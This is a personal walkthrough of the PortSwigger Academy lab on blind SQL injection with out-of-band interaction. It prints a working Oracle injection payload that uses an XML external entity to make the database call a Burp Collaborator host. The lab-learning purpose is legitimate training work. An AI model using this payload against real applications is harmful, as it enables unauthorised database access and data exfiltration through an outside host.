# Write-up: Blind SQL injection with out-of-band interaction @ PortSwigger Academy

![logo](img/logo.png)

This write-up for the lab *Blind SQL injection with out-of-band interaction* is part of my walkthrough series for [PortSwigger's Web Security Academy](https://portswigger.net/web-security).

Lab-Link: <https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band>  
Difficulty: PRACTITIONER  
Burp Suite Professional is required to solve this lab!

## Lab description

![Lab description](img/lab-description.png)

## Query

The query used in the lab will look something like

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

In my case, the cookie contains this content
`Cookie: TrackingId=uD5bMjtaBP5WNste; session=npWR2WTlX6rdoW3hr8p71NaSzOy2QZzD`

I will omit the complete cookie content from now on and only provide the string appended to the TrackingId value.

## Steps

The first step is to create a new Burp Collaborator listener

![create collaborator](img/create_collaborator.png)

The [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) contains multiple strings to cause a DNS lookup. I don't know the database engine used, so I try all payloads given there.

Starting with Oracle, I send a request to Burp Repeater and append the given payload to the cookie value:

![Request](img/request.png)

I ensure the query remains valid by adding brackets, concatenations and quotes around the payload (`'||(<PAYLOAD>)||'`) to create this query:

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://h9r49h8t93o98v0z0canusskqbw1kq.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)||'
```

After sending the request and refreshing the Burp Collaborator, I see several requests:

![collaborator hit](img/collaborator_result.png)

At the same time, the lab updates to

![success](img/success.png)
